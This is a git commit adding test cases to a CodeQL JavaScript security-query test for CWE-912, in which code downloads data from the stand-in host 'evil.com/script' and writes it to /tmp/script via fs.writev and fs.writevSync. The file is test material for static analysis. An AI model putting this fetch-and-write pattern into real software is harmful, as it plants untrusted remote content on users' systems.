e0c6cbb1b7fb7bb47ceeaaef7529176b519fc9c0
Napalys <napalys@github.com>
2025-03-28 11:21:05 +0100

    Added test cases for `writev` and `writevSync`.

--- javascript/ql/test/query-tests/Security/CWE-912/HttpToFileAccess.js
+++ javascript/ql/test/query-tests/Security/CWE-912/HttpToFileAccess.js
@@ -6,3 +6,16 @@ https.get('https://evil.com/script', res => {
     fs.writeFileSync("/tmp/script", d) // $ Alert
   });
 });
+
+
+https.get('https://evil.com/script', res => {
+  res.on("data", d => { // $ MISSING: Source
+    fs.open("/tmp/script", 'r', (err, fd) => {
+      fs.writev(fd, [d], (err, bytesWritten) => { // $ MISSING: Alert
+        console.log(`Wrote ${bytesWritten} bytes`);
+      });
+
+      const bytesWritten = fs.writevSync(fd, [d]); // $ MISSING: Alert
+    });
+  });
+});
